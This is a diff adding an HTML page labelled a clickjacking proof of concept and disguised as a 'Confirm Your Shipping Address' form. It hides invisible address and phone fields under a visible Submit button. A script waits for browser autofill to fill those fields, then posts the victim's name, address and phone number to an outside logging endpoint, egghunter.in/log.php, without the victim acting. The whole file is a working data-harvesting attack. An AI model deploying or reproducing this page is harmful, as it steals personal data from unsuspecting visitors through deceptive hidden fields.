@@ -1,0 +1,138 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Address Details - Clickjacking PoC</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f2f2f2;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            margin: 0;
+            height: 100vh;
+        }
+        .address-container {
+            background-color: white;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            width: 350px;
+            margin-top: auto;
+            position: relative;
+        }
+        .address-container h2 {
+            margin-bottom: 20px;
+            font-size: 22px;
+            text-align: center;
+            color: #333;
+        }
+        .address-container input[type="text"],
+        .address-container input[type="number"] {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            position: absolute;
+            top: 0;
+            left: 0;
+            opacity: 0;
+        }
+        .address-container input[type="submit"] {
+            width: 100%;
+            padding: 12px;
+            background-color: #4CAF50;
+            border: none;
+            border-radius: 5px;
+            color: white;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            position: relative;
+            z-index: 2;
+        }
+        .address-container input[type="submit"]:hover {
+            background-color: #45a049;
+        }
+        .location-icon {
+            position: absolute;
+            top: 70px;
+            left: 0;
+            width: 100%;
+            height: 50px;
+            background: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="%23cccccc"><path d="M12 2C8.13 2 5 5.13 5 9c0 5.25 7 13 7 13s7-7.75 7-13c0-3.87-3.13-7-7-7zm0 9.5c-1.38 0-2.5-1.12-2.5-2.5s1.12-2.5 2.5-2.5 2.5 1.12 2.5 2.5-1.12 2.5-2.5 2.5z"/></svg>') no-repeat center;
+            background-size: contain;
+            z-index: 1;
+            opacity: 0.5;
+        }
+        .info-text {
+            text-align: center;
+            color: #666;
+            font-size: 14px;
+            margin-bottom: 15px;
+        }
+    </style>
+</head>
+<body>
+    <div class="address-container">
+        <h2>Confirm Your Shipping Address</h2>
+        <div class="info-text">Please click Submit to continue</div>
+        
+        <form id="addressForm" action="https://egghunter.in/log.php" method="POST">
+            <div class="location-icon"></div>
+            
+            <!-- Hidden fields untuk address autofill -->
+            <input type="text" id="fullname" name="fullname" placeholder="Full Name" required>
+            <input type="text" id="street" name="street" placeholder="Street Address" required>
+            <input type="text" id="city" name="city" placeholder="City" required>
+            <input type="text" id="state" name="state" placeholder="State/Province" required>
+            <input type="text" id="zipcode" name="zipcode" placeholder="ZIP/Postal Code" required>
+            <input type="text" id="country" name="country" placeholder="Country" required>
+            <input type="text" id="phone" name="phone" placeholder="Phone Number">
+            
+            <!-- Submit button yang terlihat -->
+            <input type="submit" value="Submit Address">
+        </form>
+    </div>
+
+    <script>
+        function checkInputsAndSubmit() {
+            const fullname = document.getElementById('fullname').value;
+            const street = document.getElementById('street').value;
+            const city = document.getElementById('city').value;
+            const zipcode = document.getElementById('zipcode').value;
+            const country = document.getElementById('country').value;
+
+            if (fullname && street && city && zipcode && country) {
+                console.log('Address autofill detected, submitting...');
+                console.log('Captured address:', {
+                    fullname: fullname,
+                    street: street,
+                    city: city,
+                    state: document.getElementById('state').value,
+                    zipcode: zipcode,
+                    country: country,
+                    phone: document.getElementById('phone').value
+                });
+                
+                // Submit form ke webhook
+                document.getElementById('addressForm').submit();
+            }
+        }
+
+        document.getElementById('fullname').addEventListener('input', checkInputsAndSubmit);
+        document.getElementById('street').addEventListener('input', checkInputsAndSubmit);
+        document.getElementById('city').addEventListener('input', checkInputsAndSubmit);
+        document.getElementById('state').addEventListener('input', checkInputsAndSubmit);
+        document.getElementById('zipcode').addEventListener('input', checkInputsAndSubmit);
+        document.getElementById('country').addEventListener('input', checkInputsAndSubmit);
+        document.getElementById('phone').addEventListener('input', checkInputsAndSubmit);
+        
+       
+    </script>
+</body>
+</html>
